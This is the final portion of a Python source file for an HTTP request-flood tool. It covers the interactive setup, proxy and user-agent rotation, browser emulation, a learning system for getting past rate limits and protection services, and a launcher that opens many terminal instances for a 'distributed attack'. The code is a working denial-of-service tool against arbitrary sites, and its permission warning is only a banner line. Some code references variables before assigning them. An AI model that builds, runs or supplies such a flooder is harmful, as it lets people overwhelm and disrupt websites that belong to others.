            for code, count in final_stats['top_status_codes']:
                print(f"  - {code}: {count} requests")
                
        # Show machine learning results if enabled
        if self.enable_learning:
            print("\nMachine Learning Results:")
            learning_stats = self.learning_system.get_learning_stats()
            print(f"Total learning data points: {learning_stats['total_requests']}")
            print(f"Success rate: {learning_stats['success_rate']:.2f}%")
            print(f"Blocked patterns detected: {learning_stats['blocked_patterns']}")
            print(f"Blocked user agents: {learning_stats['blocked_user_agents']}")
            
            # Display best strategies found
            if "best_strategies" in learning_stats and learning_stats["best_strategies"]:
                strategies = learning_stats["best_strategies"]
                print("\nMost effective strategies found:")
                if "method" in strategies:
                    print(f"  - Best HTTP method: {strategies['method']}")
                if "delay" in strategies:
                    print(f"  - Optimal delay: {strategies['delay']:.2f}s")
                if "user_agent" in strategies:
                    print(f"  - Effective user agent: {strategies['user_agent'][:50]}..." if len(strategies['user_agent']) > 50 else strategies['user_agent'])
            
            print(f"\nLearning data saved to: {self.learning_system.persistence_file}")
        
        # Add rate limiting summary if detected
        rate_limit_summary = self.rate_limit_detector.get_summary()
        if rate_limit_summary:
            print("\nRate Limiting Detection Results:")
            print(rate_limit_summary)
            print("\nThe target website appears to have rate limiting or request blocking mechanisms.")
            print(self.rate_limit_detector.get_recommendations())
        else:
            print("\nNo rate limiting detected during this session.")
        
        # Add protection system info if detected
        if self.bypass_engine.protection_type:
            print(f"\nProtection System Detected: {self.bypass_engine.protection_type.title()}")
            print("Consider using the following for better results:")
            print("- Enable Browser Emulation")
            print("- Use proxies for IP rotation")
            print("- Add randomized delays between requests")
            print("- Reduce concurrency")
        
        # Final suggestions
        print("\nFor better results in future runs, consider:")
        print("1. Using proxies to distribute requests across multiple IPs")
        print("2. Enabling Browser Emulation mode for better protection bypass")
        print("3. Using Machine Learning to automatically improve success rate")
        print("4. Adding random delays between requests (0.1-0.5s)")
        print("5. Reducing concurrency if success rate is low")
            
        print("="*75)
    
    def _setup_signal_handlers(self):
        """Set up signal handlers for graceful shutdown."""
        if platform.system() != "Windows":  # Windows doesn't support SIGINT/SIGTERM the same way
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(
                    sig,
                    lambda s=sig: asyncio.create_task(self._signal_handler(s))
                )
    
    async def _signal_handler(self, sig):
        """Handle termination signals."""
        print(f"\nReceived signal {sig.name}, shutting down...")
        self.running = False
        await self.stop()


async def main_async():
    """Main asynchronous function to handle the request flood process."""
    # Parse command line arguments for better control
    parser = argparse.ArgumentParser(description="Advanced HTTP Request Flood Tool with Protection Bypass and Machine Learning")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-n", "--num-requests", type=int, help="Number of requests to send")
    parser.add_argument("-c", "--concurrency", type=int, help="Concurrency level (parallel connections)")
    parser.add_argument("-t", "--timeout", type=float, default=DEFAULT_TIMEOUT, help="Request timeout in seconds")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("-p", "--proxy-file", help="Path to proxy list file (one proxy per line)")
    parser.add_argument("-r", "--rotate-agents", action="store_true", help="Rotate user agents")
    parser.add_argument("-m", "--rotate-methods", action="store_true", help="Rotate HTTP methods")
    parser.add_argument("-v", "--vary-urls", action="store_true", help="Vary request URLs")
    parser.add_argument("-b", "--browser-emulation", action="store_true", help="Enable browser emulation")
    parser.add_argument("-a", "--adaptive", action="store_true", help="Enable adaptive mode")
    parser.add_argument("-l", "--learning", action="store_true", help="Enable machine learning")
    parser.add_argument("--learning-file", help="Path to learning persistence file")
    parser.add_argument("--debug", action="store_true", help="Show debug logs")
    parser.add_argument("-i", "--instances", type=int, default=1, help="Number of parallel instances to run")
    parser.add_argument("--child-instance", action="store_true", help="Flag for child processes (internal use)")
    
    args = parser.parse_args()
    
    # Check if this is the parent process and multiple instances are requested
    if not args.child_instance and args.instances > 1:
        return await launch_multiple_instances(args)
        
    # Set debug mode if requested
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Display banner for the tool
    print("\n" + "="*75)
    print("⚡ ADVANCED HTTP REQUEST FLOOD TOOL WITH PROTECTION BYPASS AND MACHINE LEARNING ⚡")
    print("Improved version with enhanced reliability, protection bypass and learning capabilities")
    print("="*75)
    
    if USING_UVLOOP:
        print("✅ uvloop detected and enabled for maximum performance!")
    else:
        print("ℹ️ Install 'uvloop' package for even faster performance (pip install uvloop)")
    
    if FAKER_AVAILABLE:
        print("✅ faker detected - enhanced browser emulation available")
    else:
        print("ℹ️ Install 'faker' package for better browser emulation (pip install faker)")
        
    # Display system information
    print(f"System: {platform.system()} {platform.release()}")
    print(f"Python: {platform.python_version()}")
    if args.child_instance:
        print(f"Instance: Child process {os.getpid()}")
    print("="*75 + "\n")
    
    # Get user input for URL and number of requests if not provided as arguments
    url = args.url
    if not url:
        url = input("Enter target URL (e.g., https://example.com): ")
    
    # Validate URL
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
        print(f"Added https:// prefix. URL is now: {url}")
    
    # Verify basic URL format
    try:
        parsed = urlparse(url)
        if not parsed.netloc:
            print("[ERROR] Invalid URL format. Please include a valid domain.")
            return 1
    except Exception:
        print("[ERROR] Could not parse URL. Please enter a valid URL.")
        return 1
    
    # Ask about browser emulation
    browser_emulation = args.browser_emulation
    if not args.url and not args.child_instance:  # Only ask if not provided as argument and not a child process
        emulation_choice = input("Enable browser emulation for better protection bypass? (y/n, default: n): ").strip().lower()
        browser_emulation = emulation_choice.startswith('y')
    
    # Ask about user agent options
    rotate_user_agents = args.rotate_agents
    user_agent = None
    if not args.url and not args.child_instance:  # Only ask if not provided as argument and not a child process
        ua_choice = input("User-Agent options:\n1. Use default realistic browser User-Agent\n2. Use custom User-Agent\n3. Rotate between multiple realistic User-Agents\nEnter choice (1-3, default: 3): ").strip()
        
        if ua_choice == "2":
            user_agent = input("Enter custom User-Agent string: ")
        elif ua_choice == "" or ua_choice == "3":
            rotate_user_agents = True
            print("Will rotate between multiple realistic browser User-Agents.")
        else:
            print(f"Using default User-Agent: {USER_AGENTS[0]}")
    
    # Get number of requests
    num_requests = args.num_requests
    if not num_requests and not args.child_instance:  # Don't ask if child process
        while True:
            try:
                num_requests = int(input("Enter number of requests to send: "))
                if num_requests <= 0:
                    print("Please enter a positive number.")
                    continue
                break
            except ValueError:
                print("Please enter a valid number.")
    
    # Get concurrency level based on number of requests
    concurrency = args.concurrency
    if not concurrency and not args.child_instance:  # Don't ask if child process
        while True:
            try:
                # More conservative default for better stability
                suggested = min(100, max(10, num_requests // 50))
                concurrency_input = input(f"Enter concurrency level (parallel connections, suggested: {suggested}): ") or str(suggested)
                concurrency = int(concurrency_input)
                if concurrency <= 0:
                    print("Please enter a positive number.")
                    continue
                if concurrency > 500:
                    print("[WARNING] Very high concurrency may cause errors or unreliable results.")
                    print("Are you sure? (y/n)")
                    if input().lower() != 'y':
                        continue
                break
            except ValueError:
                print("Please enter a valid number.")
    
    # Calculate batch size based on concurrency
    batch_size = min(50, max(10, concurrency // 2))  # Keep batch size reasonable
    
    # Get number of instances if not provided as arguments
    instances = args.instances
    if not instances and not args.child_instance:  # Don't ask if child process
        while True:
            try:
                instances_input = input("\nHow many terminal instances would you like to run? (1-100, default: 1): ")
                if not instances_input.strip():
                    instances = 1
                    break
                instances = int(instances_input)
                if instances <= 0:
                    print("Please enter a positive number.")
                    continue
                if instances > 100:
                    print("[WARNING] Very high number of instances may overload your system.")
                    confirm = input("Are you sure you want to launch 100+ terminals? (y/n): ")
                    if confirm.lower() != 'y':
                        continue
                break
            except ValueError:
                print("Please enter a valid number.")
        
        # If multiple instances requested, launch them
        if instances > 1:
            # Pass all gathered parameters to the multiple instance launcher
            multi_args = argparse.Namespace(
                url=url,
                num_requests=num_requests,
                concurrency=concurrency,
                timeout=timeout,
                delay=request_delay,
                proxy_file=proxy_file,
                rotate_agents=rotate_user_agents,
                rotate_methods=method_rotation,
                vary_urls=vary_request_type,
                browser_emulation=browser_emulation,
                adaptive=adaptive_mode,
                learning=enable_learning,
                learning_file=learning_file,
                debug=args.debug,
                instances=instances,
                child_instance=False
            )
            return await launch_multiple_instances(multi_args)

    
    # Ask for timeout
    timeout = args.timeout
    if not args.url and not args.child_instance:  # Don't ask if child process
        custom_timeout = input(f"Enter request timeout in seconds (default: {DEFAULT_TIMEOUT}): ")
        if custom_timeout.strip():
            try:
                timeout = float(custom_timeout)
            except ValueError:
                print(f"Invalid timeout, using default: {DEFAULT_TIMEOUT}")
    
    # Show title only once option
    show_title_once = True
    if not args.url and not args.child_instance:  # Don't ask if child process
        title_option = input("Show website title only once when successful? (y/n, default: y): ")
        show_title_once = not title_option.lower().startswith('n')
    
    # Add request delay option
    request_delay = args.delay
    if not args.url and not args.child_instance and request_delay == 0:  # Don't ask if child process
        add_delay = input("Add delay between individual requests to bypass rate limits? (y/n, default: n): ")
        
        if add_delay.lower().startswith('y'):
            delay_input = input("Enter delay in seconds (e.g., 0.1 for 100ms): ")
            try:
                request_delay = float(delay_input)
            except ValueError:
                print("Invalid delay, using no delay")
                request_delay = 0
    
    # Ask about HTTP method rotation
    method_rotation = args.rotate_methods
    if not args.url and not args.child_instance:  # Don't ask if child process
        method_option = input("Rotate between different HTTP methods (GET, HEAD, POST)? (y/n, default: n): ")
        method_rotation = method_option.lower().startswith('y')
    
    # Ask about URL variation
    vary_request_type = args.vary_urls
    if not args.url and not args.child_instance:  # Don't ask if child process
        vary_option = input("Vary request URLs to simulate realistic browsing? (y/n, default: n): ")
        vary_request_type = vary_option.lower().startswith('y')
    
    # Ask about adaptive mode
    adaptive_mode = args.adaptive
    if not args.url and not args.child_instance:  # Don't ask if child process
        adaptive_option = input("Use adaptive mode to automatically adjust request rate if rate limiting is detected? (y/n, default: y): ")
        adaptive_mode = not adaptive_option.lower().startswith('n')
    
    # Ask about rate limit detection behavior
    pause_on_rate_limit = True
    if not args.url and not args.child_instance:  # Don't ask if child process
        pause_option = input("Pause temporarily when rate limiting is detected? (y/n, default: y): ")
        pause_on_rate_limit = not pause_option.lower().startswith('n')
    
    # Ask about machine learning
    enable_learning = args.learning
    learning_file = args.learning_file
    if not args.url and not args.child_instance:  # Don't ask if child process
        learning_option = input("Enable machine learning to improve success rate? (y/n, default: y): ")
        enable_learning = not learning_option.lower().startswith('n')
        
        if enable_learning:
            learning_file_option = input("Enter path to learning persistence file (leave empty for auto-generated): ")
            if learning_file_option.strip():
                learning_file = learning_file_option
    
    # Ask about multi-instance operation
    multi_instances = args.instances
    if not args.url and not args.child_instance:  # Don't ask if child process or CLI args
        multi_option = input("\nWould you like to run multiple instances to increase request rate? (y/n, default: n): ")
        if multi_option.lower().startswith('y'):
            while True:
                try:
                    instances_input = input("Enter number of terminal instances to run (2-50, recommended: 5): ")
                    if not instances_input.strip():
                        multi_instances = 5  # Default to 5 if empty
                    else:
                        multi_instances = int(instances_input)
                    
                    if multi_instances <= 1:
                        print("Please enter a number greater than 1.")
                        continue
                    
                    if multi_instances > 50:
                        print("[WARNING] Very high number of instances may overload your system.")
                        confirm = input("Are you sure you want to launch more than 50 terminals? (y/n): ")
                        if confirm.lower() != 'y':
                            continue
                    
                    # Calculate estimated RPS
                    estimated_rps = (num_requests / 60) * multi_instances
                    print(f"[INFO] Estimated maximum request rate: {estimated_rps:.1f} requests/second")
                    print(f"[INFO] Will launch {multi_instances} separate terminal windows targeting {url}")
                    confirm = input("Proceed with multi-instance attack? (y/n): ")
                    if confirm.lower() != 'y':
                        multi_instances = 1  # Fall back to single instance
                    
                    break
                except ValueError:
                    print("Please enter a valid number.")
                    
    # Log level setting
    if not args.debug and not args.url and not args.child_instance:
        # Set logging level to ERROR by default for better performance
        logging.getLogger().setLevel(logging.ERROR)

    
    # Ask about using proxies
    proxies = []
    proxy_file = args.proxy_file
    if not proxy_file and not args.url and not args.child_instance:  # Don't ask if child process
        use_proxies = input("Do you want to use proxies? (y/n, default: n): ").lower().startswith('y')
        
        if use_proxies:
            proxy_file = input("Enter path to proxy list file (one proxy per line): ")
    
    if proxy_file:
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(proxies)} proxies from {proxy_file}")
        except Exception as e:
            print(f"Error loading proxy file: {str(e)}")
            if not args.url and not args.child_instance:  # Don't ask if child process
                use_proxies_anyway = input("Continue without proxies? (y/n, default: y): ")
                if not use_proxies_anyway.lower().startswith('y') and not use_proxies_anyway == '':
                    return 1
    
    # Initialize components
    stats = RequestStats()
    analyzer = ContentAnalyzer()
    
    # Initialize controller
    controller = FloodController(
        url=url,
        stats=stats,
        analyzer=analyzer,
        timeout=timeout,
        proxies=proxies,
        user_agent=user_agent,
        show_title_once=show_title_once,
        request_delay=request_delay,
        rotate_user_agents=rotate_user_agents,
        vary_request_type=vary_request_type,
        browser_emulation=browser_emulation,
        method_rotation=method_rotation,
        enable_learning=enable_learning,
        learning_persistence_file=learning_file
    )
    
    # Set rate limit pause behavior
    controller.pause_on_rate_limit = pause_on_rate_limit
    controller.adaptive_mode = adaptive_mode
    
    # Print warning before starting
    print("\nWARNING: This tool will send a large number of requests very quickly.")
    print("Make sure you have permission to test the target system.")
    print("The tool will display website title when a successful connection is made.")
    print("Rate limit detection is enabled and will warn you if the server appears to be limiting requests.")
    if enable_learning:
        print("Machine learning is enabled and will optimize requests based on past successes and failures.")
    if args.child_instance:
        print(f"This is a child process (PID: {os.getpid()}) as part of a multi-instance attack.")
    print("Press Ctrl+C at any time to stop.\n")
    
    # Launch multiple instances if configured
    if multi_instances > 1 and not args.child_instance:
        print(f"Launching {multi_instances} instances for distributed attack...")
        
        # Create args namespace for launching instances
        launch_args = argparse.Namespace(
            url=url,
            num_requests=num_requests,
            concurrency=concurrency,
            timeout=timeout,
            delay=request_delay,
            proxy_file=proxy_file,
            rotate_agents=rotate_user_agents,
            rotate_methods=method_rotation,
            vary_urls=vary_request_type,
            browser_emulation=browser_emulation,
            adaptive=adaptive_mode,
            learning=enable_learning,
            learning_file=learning_file,
            debug=args.debug,
            instances=multi_instances,
            child_instance=False
        )
        return await launch_multiple_instances(launch_args)
    
    if not args.url and not args.child_instance:  # Don't ask if child process or CLI args provided
        input("Press Enter to start...")
    
    # Execute flood
    await controller.flood(num_requests, concurrency, batch_size)
    
    return 0

async def launch_multiple_instances(args):
    """Launch multiple instances of the script in separate terminals."""
    num_instances = args.instances
    
    print(f"\n[+] Launching {num_instances} parallel instances for maximum firepower...")
    print("[+] Each instance will run in a separate terminal window.")
    
    # Build the command for child processes
    script_path = os.path.abspath(sys.argv[0])
    base_cmd = [sys.executable, script_path, "--child-instance"]
    
    # Add all provided arguments except --instances
    for arg_name, arg_value in vars(args).items():
        if arg_name != "instances" and arg_name != "child_instance" and arg_value is not None:
            if isinstance(arg_value, bool):
                if arg_value:
                    base_cmd.append(f"--{arg_name.replace('_', '-')}")
            else:
                base_cmd.append(f"--{arg_name.replace('_', '-')}")
                base_cmd.append(str(arg_value))
    
    # Launch processes based on the OS
    processes = []
    
    if platform.system() == "Windows":
        for i in range(num_instances):
            instance_id = f"Instance #{i+1}"
            
            # Convert the command list to a single string with proper quoting
            cmd_str = " ".join(base_cmd)
            
            # On Windows, we need to use cmd's start command with proper quoting
            # The /B flag starts the process without creating a new console window
            # The /WAIT flag waits for the process to complete
            # The "" empty title parameter is needed before the actual command
            full_cmd = f'start "HTTP Flood {instance_id}" cmd /c {cmd_str}'
            
            # Use shell=True for Windows start command to work properly
            subprocess.Popen(full_cmd, shell=True)
            
            print(f"[+] Launched {instance_id} (PID unknown on Windows)")
            time.sleep(0.5)  # Small delay to prevent terminal flood
            
    elif platform.system() == "Darwin":  # macOS
        for i in range(num_instances):
            instance_id = f"Instance #{i+1}"
            # Use osascript to open new Terminal window
            cmd_str = " ".join(base_cmd)
            apple_script = f'tell app "Terminal" to do script "{cmd_str}"'
            subprocess.Popen(["osascript", "-e", apple_script])
            print(f"[+] Launched {instance_id} (PID unknown on macOS)")
            time.sleep(0.5)  # Small delay to prevent terminal flood
            
    else:  # Linux and other UNIX-like systems
        # Detect available terminal emulators
        terminal_emulators = ["gnome-terminal", "xterm", "konsole", "xfce4-terminal", "terminator"]
        terminal = None
        
        for emulator in terminal_emulators:
            if subprocess.call(["which", emulator], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                terminal = emulator
                break
        
        if terminal:
            for i in range(num_instances):
                instance_id = f"Instance #{i+1}"
                cmd_str = " ".join(base_cmd)
                
                if terminal == "gnome-terminal":
                    proc = subprocess.Popen([terminal, "--", "bash", "-c", f"{cmd_str}; exec bash"])
                elif terminal == "konsole":
                    proc = subprocess.Popen([terminal, "-e", f"bash -c '{cmd_str}; exec bash'"])
                elif terminal == "xfce4-terminal":
                    proc = subprocess.Popen([terminal, "-e", f"bash -c '{cmd_str}; exec bash'"])
                elif terminal == "terminator":
                    proc = subprocess.Popen([terminal, "-e", f"bash -c '{cmd_str}; exec bash'"])
                else:  # xterm and fallback
                    proc = subprocess.Popen([terminal, "-e", f"bash -c '{cmd_str}; exec bash'"])
                
                processes.append(proc)
                print(f"[+] Launched {instance_id} (PID: {proc.pid if proc else 'unknown'})")
                time.sleep(0.5)  # Small delay to prevent terminal flood
        else:
            print("[!] No supported terminal emulator found. Falling back to subprocess mode.")
            # Fallback to subprocess without new terminal window
            for i in range(num_instances):
                instance_id = f"Instance #{i+1}"
                proc = subprocess.Popen(base_cmd)
                processes.append(proc)
                print(f"[+] Launched {instance_id} (PID: {proc.pid})")
                time.sleep(0.5)  # Small delay to prevent console flood
    
    print(f"\n[+] Successfully launched {num_instances} instances!")
    print("[+] Each instance will run with the following parameters:")
    print(f"    URL: {args.url}")
    print(f"    Requests per instance: {args.num_requests}")
    print(f"    Concurrency per instance: {args.concurrency}")
    print(f"    Total theoretical RPS: {args.num_requests * num_instances / 60:.2f}/s")
    print("\n[+] Control+C in individual terminals to stop specific instances")
    print("[+] Or close all terminal windows to stop all instances")
    
    # Wait for user to press Enter to exit
    try:
        input("\n[+] Press Enter to exit this control terminal (instances will continue running)...")
    except KeyboardInterrupt:
        print("\n[+] Interrupted by user. Child instances will continue running.")
    
    return 0


def main():
    """Entry point for the application."""
    try:
        # For Windows compatibility
        if sys.platform == "win32":
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
        return asyncio.run(main_async())
    except KeyboardInterrupt:
        logger.info("\nOperation cancelled by user.")
        return 130
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    # Performance optimization settings
    if sys.platform != "win32":
        import resource
        try:
            # Set a reasonable file descriptor limit
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            new_soft = min(8192, hard)  # More conservative limit for stability
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
            print(f"File descriptor limit set to {new_soft}")
            
            # Optimize TCP settings if running as root
            if os.geteuid() == 0:  # Root user
                try:
                    # Adjust system TCP settings for better performance
                    os.system("sysctl -w net.core.somaxconn=8192")
                    # Enable TCP Fast Open
                    os.system("sysctl -w net.ipv4.tcp_fastopen=3")
                    # Set reasonable TCP memory limits
                    os.system("sysctl -w net.ipv4.tcp_mem='8388608 8388608 8388608'")
                    print("TCP settings optimized for better performance")
                except Exception:
                    pass
        except Exception as e:
            print(f"Could not optimize system settings: {e}")
    
    # Disable most logging for speed
    logging.getLogger("asyncio").setLevel(logging.CRITICAL)
    logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
    
    print("\n⚡ ADVANCED HTTP REQUEST FLOOD TOOL WITH PROTECTION BYPASS AND MACHINE LEARNING v3.1 ⚡")
    print("Enhanced with protection bypass, advanced detection, and machine learning capabilities")
    print("Use responsibly and only on systems you have permission to test.\n")
    
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {str(e)}")
        traceback.print_exc()
        sys.exit(1)
